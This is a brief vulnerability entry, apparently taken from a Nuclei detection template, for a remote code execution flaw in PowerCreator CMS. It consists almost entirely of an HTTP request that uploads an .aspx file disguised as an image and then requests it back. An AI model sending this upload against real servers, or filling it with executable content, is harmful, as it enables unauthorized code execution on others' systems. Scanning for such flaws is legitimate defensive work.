# Vulnerability: PowerCreator CMS - Remote Code Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`powercreator-cms-rce.yaml`)

## Description
PowerCreator CMS is susceptible to a remote code execution vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /upload/UploadResourcePic.ashx?ResourceID=8382 HTTP/1.1
Host: {{Hostname}}
Content-Disposition: form-data;name="file1";filename="poc.aspx";
Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136

-----------------------------20873900192357278038549710136
Content-Disposition: form-data; name="file1"; filename="poc.aspx"
Content-Type: image/jpeg

{{randstr}}
-----------------------------20873900192357278038549710136--

GET /ResourcePic/{{endpoint}} HTTP/1.1
Host: {{Hostname}}
```

